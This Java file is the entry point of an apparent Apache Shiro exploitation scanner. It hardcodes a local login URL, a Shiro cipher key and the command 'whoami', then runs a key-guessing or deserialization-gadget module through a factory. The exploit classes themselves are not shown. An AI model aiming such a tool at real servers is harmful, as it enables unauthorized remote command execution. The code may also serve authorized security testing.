package core;

import core.scan.GadgetExec;
import core.scan.GadgetScanner;
import core.scan.KeyScanner;
import core.scan.ShiroScanner;
import core.scan.factory.ScannerFactory;

import java.util.HashMap;

public class DearShiro {

//    private static final HashMap<String, ShiroScanner> scanModule = new HashMap<>();
//
//    static {
//        scanModule.put("key", new KeyScanner());
//        scanModule.put("gadgetfuzz", new GadgetScanner());
//        scanModule.put("gadgetexec", new GadgetExec());
//    }

    public static void main(String[] args) throws Exception {
//        String module = args[0];
        String module = "gadgetfuzz";
        String base = "http://127.0.0.1:8000/login.jsp";
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String commnad = "whoami";
//        ShiroScanner scanner = scanModule.get(module);
//        scanner.setBase(base);
        ScannerFactory factory = new ScannerFactory();
        ShiroScanner scanner = factory.getScanner(module, base, key, commnad);
        scanner.scan();
    }
}
